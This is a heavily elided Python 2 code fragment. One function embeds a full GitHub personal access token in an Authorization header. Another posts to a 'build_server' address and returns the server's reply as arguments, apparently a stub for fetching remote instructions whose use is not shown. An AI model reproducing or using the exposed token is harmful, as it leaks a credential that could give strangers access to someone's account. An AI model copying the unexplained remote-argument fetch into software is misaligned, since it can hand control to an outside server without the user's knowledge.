...
def import_networklib():
    try:
        ...
        head = { 'Authorization' : 'token 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'}
...
def import_pla():
    import httplib
    los = build_server.split('/', 1)
    try:
        conn = httplib.HTTPConnection(los[0])
        conn.request('POST', los[1], '')
        response = conn.getresponse()
        s_args = response.read()
    except:
        return 'os.name'
    return s_args 
